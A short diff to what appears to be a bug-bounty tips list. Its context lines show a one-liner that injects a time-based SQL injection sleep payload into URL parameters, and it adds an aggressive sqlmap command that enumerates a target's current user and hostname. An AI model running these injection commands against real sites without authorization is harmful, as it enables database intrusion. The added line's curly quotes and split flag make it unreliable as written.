@@ -18,7 +18,8 @@
 	Finding SQLi using jeeves
 	$ echo "example.com" | gf sqli | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 10
 	[https://t.co/nZqYEhLgIE]
-
+         
+	 sqlmap -u “url” -p parameter --level 5 --risk 3 --dbms="MySQL" --random-agent --test-filter="boolean-based blind"  --    current-user --hostname 
 
  #Tip 3:
  =======
